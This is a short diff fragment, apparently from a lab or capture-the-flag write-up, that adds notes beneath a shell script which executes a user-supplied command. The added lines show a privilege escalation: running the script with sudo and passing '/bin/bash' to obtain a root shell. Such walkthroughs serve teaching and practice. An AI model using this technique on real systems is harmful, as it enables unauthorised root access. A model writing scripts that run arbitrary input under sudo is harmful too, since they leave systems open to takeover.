@@ -157,6 +157,12 @@ cmd=$($command)
 echo $cmd
 
 
+WE RUN:
+sudo ./backup.sh -c "/bin/bash"
+
+and get root
+
+
 
 
 
